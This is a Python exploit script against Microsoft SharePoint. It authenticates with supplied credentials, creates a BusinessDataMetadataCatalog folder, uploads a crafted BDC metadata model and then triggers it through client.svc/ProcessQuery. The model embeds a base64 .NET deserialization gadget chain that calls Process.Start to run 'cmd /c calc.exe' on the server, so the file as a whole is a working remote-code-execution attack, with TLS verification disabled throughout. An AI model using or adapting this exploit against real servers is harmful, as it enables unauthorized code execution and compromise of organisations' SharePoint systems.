# -*- coding: utf-8 -*-

import requests
from requests_ntlm2 import HttpNtlmAuth
from urllib3.exceptions import InsecureRequestWarning
# from urllib import quote_plus
import sys, time
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

session = requests.session()
target1 = sys.argv[1]
username = sys.argv[2]
pwd = sys.argv[3]
# cmd = sys.argv[4]
# username = "spuser"
# pwd = "Abcd@@1234"
site = "/my/personal/" + username
target = target1 + site
# cmd = "calc.exe"

print("Target: " + target1)

digest = ""
auth = HttpNtlmAuth('%s' % (username), 
                        pwd)
# auth = {}
PROXY = {}
burp0_url = target1 + "/_api/web/"
burp0_headers = {"Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", "Cache-Control": "max-age=0", "X-RequestDigest": digest, "Upgrade-Insecure-Requests": "1", "Accept": "application/json;odata=verbose", "Content-Type": "application/json;odata=verbose"}

content = session.get(burp0_url, headers=burp0_headers,  auth=auth, verify=False)

if content.status_code == 401:
    print("User is not site owner or wrong creds!")
    burp0_url = target1 + "/my/"
    burp0_headers = {"Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", "Cache-Control": "max-age=0", "X-RequestDigest": digest, "Upgrade-Insecure-Requests": "1", "Accept": "application/json;odata=verbose", "Content-Type": "application/json;odata=verbose"}

    content = session.get(burp0_url, headers=burp0_headers,  auth=auth, verify=False, proxies=PROXY)

    print(content.status_code)

    if content.status_code == 401:
        print("Wrong credentials!")
        exit()
else:
    target = target1
    site = ""


time.sleep(5)
# need time to setup the personal site
burp0_url = target + "/_api/web/Folders"
burp0_headers = {"Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", "Cache-Control": "max-age=0", "X-RequestDigest": digest, "Upgrade-Insecure-Requests": "1", "Accept": "application/json;odata=verbose", "Content-Type": "application/json;odata=verbose"}
burp0_json={"__metadata": {"type": "SP.Folder"}, "ServerRelativeUrl": site + "/BusinessDataMetadataCatalog"}
content = session.post(burp0_url, headers=burp0_headers, json=burp0_json, auth=auth, verify=False, proxies=PROXY)

if content.status_code == 401:
    print("Wrong credentials!")
    exit()

print(burp0_url)
digest = content.headers['X-RequestDigest']

#Create BusinessDataMetadataCatalog folder
burp0_url = target + "/_api/web/Folders"
burp0_headers = {"Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", "Cache-Control": "max-age=0", "X-RequestDigest": digest, "Upgrade-Insecure-Requests": "1", "Accept": "application/json;odata=verbose", "Content-Type": "application/json;odata=verbose"}
burp0_json={"__metadata": {"type": "SP.Folder"}, "ServerRelativeUrl": site + "/BusinessDataMetadataCatalog"}
content = session.post(burp0_url, headers=burp0_headers, json=burp0_json, auth=auth, verify=False, proxies=PROXY)
# print(content.content)
if content.status_code != 201:
    
    print("Error while creating folder, folder may be existed")

#create bdcm file
burp0_url = target + "/_api/web/GetFolderByServerRelativeUrl('"+site+"/BusinessDataMetadataCatalog/')/Files/add(url='"+site+"/BusinessDataMetadataCatalog/BDCMetadata.bdcm',overwrite=true)"

burp0_headers = {"Connection": "close", "X-RequestDigest": digest, "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "User-Agent": "python-requests/2.27.1", "Content-type": "application/x-www-form-urlencoded"}
burp0_data = """<?xml version="1.0" encoding="utf-8"?><Model xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" Name="BDCMetadata" xmlns="http://schemas.microsoft.com/windows/2007/BusinessDataCatalog"><LobSystems><LobSystem Name="QjtvWXFT" Type="DotNetAssembly"><Properties><Property Name="WsdlFetchUrl" Type="System.String">http://localhost:32843/SecurityTokenServiceApplication/securitytoken.svc?singleWsdl</Property><Property Name="Class" Type="System.String">RevertToSelf</Property></Properties><LobSystemInstances><LobSystemInstance Name="QjtvWXFT"></LobSystemInstance></LobSystemInstances><Entities><Entity Name="Products" DefaultDisplayName="Products" Namespace="ODataDemo" Version="1.0.0.0" EstimatedInstanceCount="2000"><Properties><Property Name="ExcludeFromOfflineClientForList" Type="System.String">False</Property>
<Property Name="Class" Type="System.String">Microsoft.SharePoint.Administration.SPClickthroughUsageDefinition, Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c</Property></Properties><Identifiers><Identifier Name="ID" TypeName="System.String" /></Identifiers><Methods><Method Name="ParseLogFileEntry" DefaultDisplayName="Create Product" IsStatic="false">
<FilterDescriptors>


<FilterDescriptor Type="Wildcard" FilterField="BdcIdentity" Name="f1" DefaultDisplayName="String" IsCached="false"></FilterDescriptor></FilterDescriptors><Parameters><Parameter Name="@ID" Direction="In"><TypeDescriptor Name="ID" DefaultDisplayName="ID" TypeName="System.String" CreatorField="true" IdentifierName="ID" AssociatedFilter="f1">
<DefaultValues>
<DefaultValue MethodInstanceName="CreateProduct" Type="System.String">x1	x2	x3	x4	x5	x6	x7	x8	x9	x10	x11	x12	AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAAsvYyBjYWxjLmV4ZQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL	x14	x15	x16</DefaultValue></DefaultValues>
</TypeDescriptor></Parameter>
<Parameter Name="@CreateProduct" Direction="Return"><TypeDescriptor Name="CreateProduct1" TypeName="System.Object"></TypeDescriptor></Parameter></Parameters><MethodInstances><MethodInstance Name="CreateProduct" Type="SpecificFinder" ReturnParameterName="@CreateProduct"><AccessControlList><AccessControlEntry Principal="STS|SecurityTokenService|http://sharepoint.microsoft.com/claims/2009/08/isauthenticated|true|http://www.w3.org/2001/XMLSchema#string"><Right BdcRight="Execute" /></AccessControlEntry></AccessControlList></MethodInstance>
<MethodInstance Name="CreateProduct1" Type="Finder" ReturnParameterName="@CreateProduct"><AccessControlList><AccessControlEntry Principal="STS|SecurityTokenService|http://sharepoint.microsoft.com/claims/2009/08/isauthenticated|true|http://www.w3.org/2001/XMLSchema#string"><Right BdcRight="Execute" /></AccessControlEntry></AccessControlList></MethodInstance></MethodInstances></Method></Methods></Entity></Entities></LobSystem></LobSystems></Model>"""
req = session.post(burp0_url, headers=burp0_headers, data=burp0_data,  auth=auth, verify=False, proxies=PROXY)
print(req.status_code)
#Trigger vuln


burp0_url = target + "/_vti_bin/client.svc/ProcessQuery"

burp0_headers = {"X-RequestDigest": digest, "Content-Type": "text/xml", "X-RequestForceAuthentication": "true", "Accept-Encoding": "gzip, deflate", "Expect": "100-continue"}
burp0_data = """<Request AddExpandoFieldTypeSuffix="true" SchemaVersion="15.0.0.0" LibraryVersion="16.0.0.0" ApplicationName=".NET Library" xmlns="http://schemas.microsoft.com/sharepoint/clientquery/2009"><Actions><ObjectPath Id="21" ObjectPathId="20" /><ObjectPath Id="23" ObjectPathId="22" /> <ObjectPath Id="25" ObjectPathId="24" /><ObjectPath Id="26" ObjectPathId="7" /></Actions><ObjectPaths><Method Id="20" ParentId="7" Name="GetCreatorView"><Parameters>
<Parameter Type="String">CreateProduct</Parameter>
</Parameters></Method>
<Method Id="22" ParentId="20" Name="GetDefaultValues"><Parameters/>
</Method>
<Method Id="26" ParentId="7" Name="GetFilters"><Parameters>
<Parameter Type="String">CreateProduct</Parameter>
</Parameters>
</Method>
<Method Id="24" ParentId="7" Name="FindFiltered"><Parameters>
<Parameter ObjectPathId="26" >
</Parameter>
<Parameter Type="String">CreateProduct1</Parameter>
<Parameter ObjectPathId="18" />
</Parameters></Method><Identity Id="7" Name="9ccba4bb-d3a8-4255-b87f-18e2d824b848|4da630b6-36c5-4f55-8e01-5cd40e96104d:entityfile:Products,ODataDemo" />
<Identity Id="17" Name="d42d9b6b-28e0-4ae8-a7f5-6503d367c115|4da630b6-36c5-4f55-8e01-5cd40e96104d:notifcallback:avkldkm.c.ultr.cc,CurrentContext" />
<Identity Id="18" Name="d42d9b6b-28e0-4ae8-a7f5-6503d367c115|4da630b6-36c5-4f55-8e01-5cd40e96104d:lsifile:QjtvWXFT,QjtvWXFT" />
</ObjectPaths></Request>"""
req = session.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=PROXY)


print("Done!")